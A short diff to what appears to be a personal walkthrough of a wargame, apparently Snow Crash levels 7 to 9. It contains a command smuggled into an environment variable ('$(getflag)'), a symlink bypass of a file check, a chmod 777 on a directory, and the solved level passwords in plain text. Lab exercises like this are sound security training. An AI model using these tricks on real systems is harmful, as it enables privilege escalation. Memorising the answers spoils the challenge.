@@ -60,12 +60,14 @@ export LOGNAME='$(getflag)' ; ./level07
 
 ## 8.
 ltrace ./level08 token
+chmod 777 .
 ln -s token my_tok && ./level08 my_tok
 su flag08 #quif5eloekouj29ke0vouxean
 getflag
 
 ## 9.
 scp -P 5000 scp://level09@localhost/token C:/Users/Vlad/snow-crash
+python break.py `cat token`
 
 su flag09 F3iji1ju5yuevaus41q1afiuq
 getflag
